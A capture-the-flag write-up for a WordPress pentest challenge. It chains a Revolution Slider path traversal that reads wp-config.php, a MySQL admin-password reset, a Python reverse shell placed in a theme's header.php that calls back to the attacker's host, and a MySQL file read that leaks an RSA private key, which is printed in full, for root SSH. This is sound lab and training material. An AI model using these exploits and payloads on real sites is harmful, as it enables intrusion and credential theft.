# Wordpress
Network/Pentest

## Challenge 

	I setup my own Wordpress site!
	I love that there are so many plugins. My favorite is Revolution Slider. Even though it's a little old it doesn't show up on wpscan!

	Please give it about 30 seconds after connecting for everything to setup correctly.
	The flag is in /root/flag.txt

	Difficulty: medium

[wordpress.ovpn](wordpress.ovpn)

## Solution

### Setup

Install OpenVPN

	$ sudo apt-get install -y openvpn

Start OpenVPN with the given configuration

	$ sudo openvpn wordpress.ovpn

### Scan Hosts

Scan subnet

	$ nmap -sP 172.30.0.0/28
	Starting Nmap 7.60 ( https://nmap.org ) at 2019-02-27 12:27 +08
	Nmap scan report for 172.30.0.2
	Host is up (0.44s latency).
	Nmap scan report for 172.30.0.3
	Host is up (0.44s latency).
	Nmap scan report for zst-VirtualBox (172.30.0.14)
	Host is up (0.000076s latency).
	Nmap done: 16 IP addresses (3 hosts up) scanned in 5.17 seconds

Found 2 hosts: `172.30.0.2` and `172.30.0.3`

Scan for ports: MySQL, SSH and HTTP are available

	$ nmap -sV 172.30.0.2
	PORT     STATE    SERVICE VERSION
	2601/tcp filtered zebra
	3306/tcp open     mysql   MySQL 5.5.62-0ubuntu0.14.04.1

	$ nmap -sV 172.30.0.3
	PORT     STATE    SERVICE VERSION
	22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.12 (Ubuntu Linux; protocol 2.0)
	80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
	3390/tcp filtered dsc
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Hence, we can visit the wordpress page at http://172.30.0.3

### Wordpress Revolution Slider Exploit

Exploit infomation:
- https://www.exploit-db.com/exploits/36554
- https://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html

Basically, we can extract the wp-config file using the following link

	http://172.30.0.3/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php

This prompts us to download a file...

> [admin-ajax.php](admin-ajax.php)

From the file we see credentials for the MySQL database

	// ** MySQL settings - You can get this info from your web host ** //
	/** The name of the database for WordPress */
	define('DB_NAME', 'wordpress');

	/** MySQL database username */
	define('DB_USER', 'wordpress');

	/** MySQL database password */
	define('DB_PASSWORD', '0NYa6PBH52y86C');

	/** MySQL hostname */
	define('DB_HOST', '172.30.0.2');

### Login to MySQL Server

Login

	$ mysql -u wordpress -h 172.30.0.2 -p
	Enter password: 0NYa6PBH52y86C

View the tables

	mysql> use wordpress;
	Database changed
	mysql> show tables;
	+-----------------------+
	| Tables_in_wordpress   |
	+-----------------------+
	| wp_commentmeta        |
	| wp_comments           |
	| wp_links              |
	| wp_options            |
	| wp_postmeta           |
	| wp_posts              |
	| wp_revslider_settings |
	| wp_revslider_sliders  |
	| wp_revslider_slides   |
	| wp_term_relationships |
	| wp_term_taxonomy      |
	| wp_termmeta           |
	| wp_terms              |
	| wp_usermeta           |
	| wp_users              |
	+-----------------------+
	15 rows in set (0.24 sec)

And we have access to the users database

	mysql> select * from wp_users
	    -> ;
	+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
	| ID | user_login | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |
	+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
	|  1 | admin      | $P$BvkkW.uullc1LFnJTGdSGkAXayYlaX0 | admin         | you@example.com |          | 2019-02-27 04:27:50 |                     |           0 | admin        |
	+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
	1 row in set (0.31 sec)

Password is hashed, but since we have access to database, we can change it to our own

	mysql> UPDATE `wp_users` SET `user_pass` = MD5('derp') WHERE `user_login` = 'admin';

Finally, we can login to Wordpress using `admin:derp` and it is successful...

![screenshot1.png](screenshot1.png)

### Reverse Shell Exploit (via Wordpress)

Let's try to get a shell. We can upload a WordPress theme that has a reverse-shell functionality

> Reference: Wordpress Reverse Shell Writeups
- https://amonsec.net/ctf/btrsys-v2-ctf-walkthrough
- https://webcache.googleusercontent.com/search?q=cache:rz9-9kV7CHYJ:https://k4r4koyun.com/tips/wordpress-reverse-shell-without-file-uploads-and-metasploit/+&cd=3&hl=en&ct=clnk&gl=sg&client=opera
- https://forum.top-hat-sec.com/index.php?topic=5758.0
- https://alexandervoidstar.wordpress.com/2017/01/08/ctf-writeup-mr-robot-1/
- https://securitybytes.io/vulnhub-com-mr-robot-1-ctf-walkthrough-7d4800fc605a


First go to **Theme Editor > Edit Themes**.

![screenshot2.png](screenshot2.png)

Here, we are going to edit `header.php`. We will replace the page header with a reverse shell code as follows. 

	<?php echo shell_exec(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.30.0.14",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`);?>

(The connection IP address is set to our local machine `172.30.0.14` at port `31337`)

![screenshot3.png](screenshot3.png)

Before we click on "Update File", launch a command line window and start listening for the connection.

	$ nc -lvp 31337

Now click on "Update File". **Load the home page in another tab to execute the reverse shell code**.

Listen using netcat at the same time, we see we received a connnection.

	Listening on [0.0.0.0] (family 0, port 31337)
	ls
	Connection from 172.30.0.3 35690 received!
	/bin/sh: 0: can't access tty; job control turned off
	$ whoami
	www-data


Unfortunately, we have no root access. And there's no indication that we can do a root escalation...

	$ cat /root/flag.txt
	cat: /root/flag.txt: Permission denied

Looking around, we see a note.

	$ ls
	index.php
	license.txt
	note.txt
	readme.html
	wp-activate.php
	wp-admin
	wp-blog-header.php
	wp-comments-post.php
	wp-config.php
	wp-content
	wp-cron.php
	wp-includes
	wp-links-opml.php
	wp-load.php
	wp-login.php
	wp-mail.php
	wp-settings.php
	wp-signup.php
	wp-trackback.php
	xmlrpc.php
	
	$ cat note.txt 
	Your ssh key was placed in /backup/id_rsa on the DB server.

We need to access the MySQL server again to get the id_rsa

### Access Server with Private Key

Load the `/backup/id_rsa` file from the MySQL server

	$ mysql -u wordpress -h 172.30.0.2 -p
	Enter password: 0NYa6PBH52y86C

	mysql> select load_file('/backup/id_rsa');
	
	-----BEGIN RSA PRIVATE KEY-----
	MIIEpAIBAAKCAQEA3Z35DpTcnm4kFkkGp6iDXqvUNH+/+hSDOY6rXsa40WMr7rjc
	tHh8TgOBFZ6Rj5VzU/jY8O0qHxiPVn7BCYKhqyp1V1l9/ZCPRSjRLYy62dVTiHUt
	ZbiPiY9+biHIsQ/nZfwiHmwlb0sWDoyFvX3OL/3AFMcYpZ4ldHQuwszJF4DeTV33
	ruSBoXIiICQyNJBHTboVel+WXAfMNumYMVNrtrwpNoD7whv9Oa2afUejXMJL42Rw
	8Xhab59HIIL9fl68FqgggVI4X3d/fzqKKGyoN5JxBLmQTCiVxhxTMv9OS0MhdSg6
	Nh3+lf/wUuweUQXqmohvETntwwGs8jnJGCyeDwIDAQABAoIBAHGVRpG/n/cfMiWt
	1dhWGMaLwJ4Ln6QXoU39nj1cEltWvayDWLKyUdtWFnGzLJ1vloVCNEX+96iqWMSX
	AG7UYfGtOCjFuDoePh/PFK6IwzdkC4UTsWnCFucFAWKGtCpzoUB24jG/ccxBqpNY
	WC9PbD7SigDcLfisPjwaU+EJPkNpl93VBk1BCJRbvWF+Wl/si3wmMZ0YRoyIAF5L
	oBsq935xH8kJcixSVYKjG3hMUZfiLoQB+p/IFsxDlfGLE+M1esTZ5GIRjj+t7vBN
	l2JZTY893gjfQzUv2WrJXzMhJvWGzOCsRRc4gOSeS6GYiip8glqg8iWHpWdgF6i9
	oAQx5pkCgYEA7oTmvy0cXvhPjkEbrizCCqf6sXfZps5e6eminTTBGA8NW/Uq+SQv
	5JEYxvIL+qMH6cKkc8rBaNhgy3vnv+UgE1PUFI0UWFGKb+OpzzvY/zkmf03enxrl
	SK+QXH4FS9f7leivZRVEWBq1kDVIqHZtybYGg0etOvHYX0GwqV2UTy0CgYEA7dv0
	bxz6CO9bhxxpXRrrykX2Z57J3JW2I3yVkCY+4Y6x106K11X+b1547kEZk40i2Ugc
	iE6jcYIRiYNiSgb0Ph4uxZHFlvBr8JA2fGHYIAnGRcoc1Gzgz5omRvU9H8uy5ipO
	LyZ2dnMgXRVOjuXoN4UZR2rgWmJVLD1q7eKnh6sCgYAnVOUUC2VNR9celx/wZdMN
	nMubLi9G8Wr3WZ6GG+fnhrvmORSABvaa005pqApPp0irxHwH2BxypJO5mlIJ88eJ
	SF6FkQoU0kVo0/rxgGX1GEB/56BZTj8W8FR23BUVf6UuADPEEHC3spfUEuVLWlQa
	WhjS1yP6v1y1wIhYNWU6dQKBgQDbZ1zdcXkh7MgcpRR7kW2WM1rK0imZk29i5HSB
	dwXhwWJCHGztnKEJ0bby7pHNDQ7sJhxLj14sQbIzikGLz0ZUVjsGeyQryrGGQUBB
	E2/sfZeqoHhfad8lICfWpDgxsA/hR3y++VekgyWDNzgzj9bX/6oFuowgUzwFhtGv
	hLbL6QKBgQCvcDMmWs2zXwmIo1+pIHUUSv2z3MWb0o1dzHQI/+FJEtyQPwL1nCwg
	bJaC0KT45kw0IGVB2jhWf0KcMF37bpMpYJzdsktSAmHdjLKdcr6vw2MNpRapaNQe
	On0QmLzbpFr9kjqorinKVkjk/WlTo9rKDSrLiUueEVYTxEMCi92giw==
	-----END RSA PRIVATE KEY-----
	
Now [copy this key](db_server-id_rsa) into my PC's `~/.ssh/id_rsa`

	$ nano ~/.ssh/id_rsa
		
Remember to include your permissions or you'll get this error.

	$ ssh root@172.30.0.3
	@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
	@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
	@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
	Permissions 0644 for '/home/zst/.ssh/id_rsa' are too open.
	It is required that your private key files are NOT accessible by others.
	This private key will be ignored.
	Load key "/home/zst/.ssh/id_rsa": bad permissions

Permissions should be changed to `-rw-------` or `600`.

	$ chmod 600 ~/.ssh/id_rsa
	$ ls -la ~/.ssh/id_rsa
	-rw------- 1 zst zst 1680 Feb 27 15:40 /home/zst/.ssh/id_rsa

Finally, we have access

	$ ssh root@172.30.0.3

	root@apacheword:~# ls -la
	total 12
	drwx------ 1 root root   20 Feb 27 07:43 .
	drwxr-xr-x 1 root root   62 Feb 27 04:27 ..
	-rw-r--r-- 1 root root 3106 Feb 20  2014 .bashrc
	drwx------ 2 root root   34 Feb 27 07:43 .cache
	-rw-r--r-- 1 root root  140 Feb 20  2014 .profile
	drwxr-xr-x 2 root root   29 Feb 22 20:12 .ssh
	-rw------- 1 root root   46 Feb 22 13:00 flag.txt
	root@apacheword:~# cat flag.txt
	gigem{w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE}

## Flag

	gigem{w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE}
